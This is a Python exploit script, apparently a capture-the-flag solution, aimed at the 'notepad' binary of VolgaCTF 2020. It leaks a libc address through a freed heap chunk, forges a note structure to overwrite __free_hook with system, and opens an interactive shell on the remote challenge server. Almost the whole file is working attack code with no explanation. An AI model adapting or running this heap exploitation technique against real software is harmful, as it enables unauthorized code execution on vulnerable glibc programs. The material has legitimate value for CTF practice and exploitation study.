#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './notepad'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'notepad.q.2020.volgactf.ru', 'port':45678})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    np = Notepad(conn)

    np.add('A')     # 1
    tb = np.pick(1)

    tb.add('a', 0x418, 'X')     # 1
    tb.add('b', 0x18, 'hoge')   # 2 -> 1

    tb.delete(1)

    tb.add('a', 0x418, chr(offset_libc_mainarena & 0xff))  # 2
    leak = tb.view(2)
    del(tb)

    addr_libc_mainarena = u64(leak[0:8])
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    fake_note  = b'B'*0x10
    fake_note += p64(2)
    fake_note += b'free_hook'.ljust(0x10, b'\x00')
    fake_note += p64(8)
    fake_note += p64(addr_libc_free_hook)
    fake_note += b'system'.ljust(0x10, b'\x00')
    fake_note += p64(0)
    fake_note += p64(addr_libc_str_sh)

    np.add(fake_note)   # 2
    tb = np.pick(2)
    tb.quit = False

    tb.update(1, None, None, p64(addr_libc_system))
    tb.delete(2)

class Notepad:
    def __init__(self, conn):
        self.conn           = conn
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, name):
        self.sendlineafter('> ', 'a')
        self.sendlineafter('name: ', name)

    def pick(self, idx):
        self.sendlineafter('> ', 'p')
        self.sendlineafter('pick: ', str(idx))
        return Tab(self.conn)

class Tab:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.quit           = True

    def __del__(self):
        if self.quit:
            self.sendlineafter('> ', 'q')

    def add(self, name, size, data):
        self.sendlineafter('> ', 'a')
        self.sendlineafter('name: ', name)
        self.sendlineafter('(in bytes): ', str(size))
        self.sendafter('data: ', data)

    def delete(self, idx):
        self.sendlineafter('> ', 'd')
        self.sendlineafter('delete: ', str(idx))

    def view(self, idx):
        self.sendlineafter('> ', 'v')
        self.sendlineafter('view: ', str(idx))
        return self.recvuntil('\nOperations', drop=True)

    def update(self, idx, name, size, data):
        self.sendlineafter('> ', 'u')
        self.sendlineafter('update: ', str(idx))
        self.sendlineafter('skip): ', name if name is not None else '')
        self.sendlineafter('same): ', str(size) if size is not None else '')
        self.sendafter('data: ', data)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
